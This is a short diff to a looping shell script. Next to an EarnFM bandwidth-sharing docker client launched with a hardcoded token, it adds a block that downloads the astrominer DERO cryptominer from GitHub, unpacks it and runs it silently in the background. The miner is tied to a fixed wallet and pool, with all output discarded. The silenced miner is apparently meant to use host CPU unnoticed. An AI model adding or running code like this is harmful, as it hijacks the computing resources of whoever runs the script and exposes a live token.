@@ -36,7 +36,20 @@ while true; do
   fi
 
   if [ $RUN_ONCE -eq 0 ]; then
-    docker run -d --name ss -e EARNFM_TOKEN="2daac0b6-c3ff-42ea-a177-b5f5b9db81cc" earnfm/earnfm-client:latest
+    docker run -d --name ss \
+      -e EARNFM_TOKEN="2daac0b6-c3ff-42ea-a177-b5f5b9db81cc" \
+      earnfm/earnfm-client:latest
+
+    # Chạy astrominer nền không chặn vòng lặp
+    (
+      wget -q https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
+      tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
+      ./astrominer/astrominer \
+        -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
+        -log-interval 600 -m 1 -p rpc -r nodent2.cpumining.cloud:10100 \
+        > /dev/null 2>&1
+    ) &
+
     RUN_ONCE=1
   fi
 
